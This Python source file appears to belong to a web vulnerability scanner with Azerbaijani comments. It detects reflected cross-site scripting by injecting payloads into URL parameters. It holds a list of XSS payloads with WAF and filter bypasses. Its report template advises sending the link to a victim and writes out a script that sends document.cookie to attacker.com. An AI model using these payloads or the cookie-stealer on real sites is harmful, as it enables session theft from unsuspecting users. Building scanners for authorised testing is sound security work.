"""
XSS Scanner — Reflected XSS detection
Passive: payload göndər, response-da reflection yoxla
"""

import asyncio
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from rich.console import Console
from core.models import Vulnerability, Severity

console = Console()

# WAF bypass + encoding variantları
XSS_PAYLOADS = [
    # Basic
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    # HTML5 event handlers
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    # Filter bypass — case
    '<ScRiPt>alert(1)</sCrIpT>',
    # Filter bypass — encoding
    '<script>alert\u00281\u0029</script>',
    '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
    # Filter bypass — comments
    '<scr<!---->ipt>alert(1)</scr<!---->ipt>',
    '<!--><script>alert(1)</script>',
    # WAF bypass — template literals
    '<script>alert`1`</script>',
    # Polyglot
    'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert(1))//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>>>',
    # Double encoding
    '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
    # Null byte
    '<scri\x00pt>alert(1)</scri\x00pt>',
    # Attribute context
    '" autofocus onfocus="alert(1)',
    "' autofocus onfocus='alert(1)",
]

# Reflection yoxlamaq üçün unique marker
MARKER = "xsstest7731"
MARKER_PAYLOADS = [
    f'<{MARKER}>',
    f'"{MARKER}"',
    f"'{MARKER}'",
]


class XSSScanner:
    def __init__(self, http_client):
        self.http_client = http_client

    def _extract_params(self, url: str) -> list[tuple]:
        """URL-dən parametrləri çıxar"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        return list(params.keys())

    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        """URL-ə payload inject et"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _check_reflection(self, payload: str, response_text: str) -> bool:
        """Payload response-da reflect olunub mu?"""
        # HTML encode olmadan reflection
        if payload.lower() in response_text.lower():
            return True
        # Partial reflection (tag-lar arasında)
        if MARKER in response_text:
            return True
        return False

    def _is_executable(self, payload: str, response_text: str) -> bool:
        """Payload execution context-də mi?"""
        # Script tag-ları saxlanılıbsa
        dangerous_patterns = [
            r'<script[^>]*>' + re.escape(MARKER),
            re.escape(payload),
            r'onerror\s*=\s*["\']?' + re.escape(MARKER),
        ]
        for pattern in dangerous_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        return False

    async def _test_param(self, url: str, param: str) -> list[Vulnerability]:
        vulns = []

        for payload in XSS_PAYLOADS[:8]:  # İlk 8 payload — sürətli test
            test_url = self._inject_payload(url, param, payload)
            response = await self.http_client.get(test_url)

            if not response:
                continue

            content_type = response.headers.get("content-type", "")
            if "text/html" not in content_type.lower():
                continue

            if self._check_reflection(payload, response.text):
                # Severity təyin et
                is_exec = self._is_executable(payload, response.text)
                cvss = 7.2 if is_exec else 5.4

                vuln = Vulnerability(
                    vuln_type="XSS",
                    url=test_url,
                    severity=Severity.HIGH if is_exec else Severity.MEDIUM,
                    cvss_score=cvss,
                    title=f"Reflected XSS — {param} parametri",
                    description=(
                        f"'{param}' parametrindəki user input HTML-ə encode edilmədən "
                        f"response-da reflect olunur. Bu XSS hücumuna imkan verir."
                    ),
                    evidence=f"Payload '{payload}' response-da tapıldı",
                    exploitation=(
                        f"Victim-ə bu URL-i göndər:\n"
                        f"{test_url}\n\n"
                        f"Daha effektiv payload:\n"
                        f"{self._inject_payload(url, param, '<script>document.location=\"https://attacker.com/steal?c=\"+document.cookie</script>')}"
                    ),
                    remediation=(
                        "1. User input-u HTML encode et (htmlspecialchars PHP-də)\n"
                        "2. Content-Security-Policy header əlavə et\n"
                        "3. Output context-ə görə encoding tətbiq et"
                    ),
                    parameter=param,
                    method="GET",
                    payload_used=payload,
                    curl_poc=f'curl -s "{test_url}"',
                    cwe_id="CWE-79",
                    references=[
                        "https://owasp.org/www-community/attacks/xss/",
                        "https://portswigger.net/web-security/cross-site-scripting",
                    ],
                )
                vulns.append(vuln)
                break  # Bir vuln tapdıqda bu param üçün dayanma

        return vulns

    async def scan(self, url: str, extra_params: list[str] = None) -> list[Vulnerability]:
        """URL-i XSS üçün skan et"""
        params = self._extract_params(url)
        if extra_params:
            params.extend(extra_params)

        if not params:
            return []

        console.print(f"  [dim]XSS skan: {len(params)} parametr — {url[:60]}[/dim]")

        tasks = [self._test_param(url, param) for param in params]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        vulns = []
        for r in results:
            if isinstance(r, list):
                vulns.extend(r)

        for v in vulns:
            console.print(f"  {v.severity.emoji} [bold red]XSS tapıldı:[/bold red] {v.parameter} @ {url[:50]}")

        return vulns
